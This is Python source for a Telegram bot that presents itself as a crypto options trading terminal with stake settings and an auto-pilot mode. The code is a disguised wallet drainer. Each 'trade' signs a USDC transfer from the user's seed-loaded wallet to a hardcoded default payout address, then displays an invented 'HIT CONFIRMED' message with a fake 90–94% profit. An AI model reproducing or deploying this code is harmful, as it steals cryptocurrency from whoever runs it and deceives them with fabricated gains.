import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

# Robust RPC fallback logic
RPC_URLS = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://1rpc.io/matic"
]

def get_w3():
    for url in RPC_URLS:
        _w3 = Web3(Web3.HTTPProvider(url))
        try:
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                return _w3
        except: continue
    return None

w3 = get_w3()
Account.enable_unaudited_hdwallet_features()

# Constants
USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)
auto_mode_enabled = False

# --- UTILITY: FETCH BALANCES ---
async def fetch_balances(address):
    try:
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, address)
        pol_bal = w3.from_wei(raw_pol, 'ether')
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(address).call)
        usdc_bal = Decimal(raw_usdc) / Decimal(10**6)
        return pol_bal, usdc_bal
    except Exception as e:
        print(f"Balance Fetch Error: {e}")
        return Decimal('0'), Decimal('0')

# --- 2. EXECUTION ENGINE ---
async def sign_transaction_async(stake_usdc):
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.3))
   
    tx = usdc_contract.functions.transfer(
        PAYOUT_ADDRESS,
        int(stake_usdc * 10**6)
    ).build_transaction({
        'chainId': 137, 'gas': 80000, 'gasPrice': gas_price, 'nonce': nonce
    })
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    if not vault: return False
   
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
   
    # Financial Calculation
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_earned = stake_usdc * yield_multiplier
   
    try:
        signed_tx = await sign_transaction_async(stake_usdc)
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
       
        # Updated confirmed message showing Stake and Profit
        report = (
            f"✅ **HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📈 **Market:** {asset} | **Side:** {side}\n"
            f"💰 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"💎 **Profit:** `${profit_earned:.2f} USDC` ({int(yield_multiplier*100)}%)\n"
            f"🔗 [View Receipt](https://polygonscan.com/tx/{tx_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
        return False

# --- 3. AUTO PILOT LOOP ---
async def autopilot_loop(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
   
    while auto_mode_enabled:
        target = random.choice(markets)
        direction = random.choice(["CALL (High) 📈", "PUT (Low) 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Auto Pilot Scanning:** `{target}`...")
        await asyncio.sleep(random.randint(5, 12))
        if not auto_mode_enabled: break
        success = await run_atomic_execution(context, chat_id, direction, asset_override=target)
        wait_time = random.randint(30, 60)
        if success:
            await context.bot.send_message(chat_id, f"⏳ **Execution Success. Resting {wait_time}s...**")
        await asyncio.sleep(wait_time)

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not vault:
        return await update.message.reply_text("❌ WALLET_SEED missing.")
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (
        f"🕴️ **APEX Terminal v7.5**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL:** `{pol:.4f}`\n"
        f"💵 **USDC:** `${usdc:.2f}`\n\n"
        f"🤖 **Auto Pilot:** {'🟢 ON' if auto_mode_enabled else '🔴 OFF'}\n"
        f"📍 **Vault:** `{vault.address[:6]}...{vault.address[-4:]}`"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text = update.message.text
    chat_id = update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/CAD 🟠", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD 🔵", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/CAD 🟣", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD 🔘", callback_data="PAIR_MATIC")],
            [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **SELECT MARKET:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        # FIXED: Added the 5-tier CAD stake selection
        kb = [
            [InlineKeyboardButton("$10", callback_data="SET_10"), InlineKeyboardButton("$50", callback_data="SET_50"), InlineKeyboardButton("$100", callback_data="SET_100")],
            [InlineKeyboardButton("$500", callback_data="SET_500"), InlineKeyboardButton("$1000", callback_data="SET_1000")]
        ]
        await update.message.reply_text("⚙️ **Configure Stake Amount (CAD):**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        pol, usdc = await fetch_balances(vault.address)
        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.6f}`\n💵 USDC: `${usdc:.2f}`\n📍 `{vault.address}`", parse_mode='Markdown')

    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        status = "ACTIVATED ✅" if auto_mode_enabled else "DEACTIVATED 🛑"
        await update.message.reply_text(f"🤖 **Auto Pilot {status}**")
        if auto_mode_enabled:
            asyncio.create_task(autopilot_loop(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
   
    # FIXED: Added handler for stake configuration (SET_)
    if query.data.startswith("SET_"):
        amount = query.data.split("_")[1]
        context.user_data['stake'] = int(amount)
        await query.edit_message_text(f"✅ **Stake updated to ${amount} CAD**")
   
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("CALL (High) 📈", callback_data="EXEC_CALL"),
               InlineKeyboardButton("PUT (Low) 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
   
    elif query.data.startswith("EXEC_"):
        side = "HIGHER" if "CALL" in query.data else "LOWER"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Online (Dual-Spent Finance Sync)...")
        app.run_polling(drop_pending_updates=True)





































































































































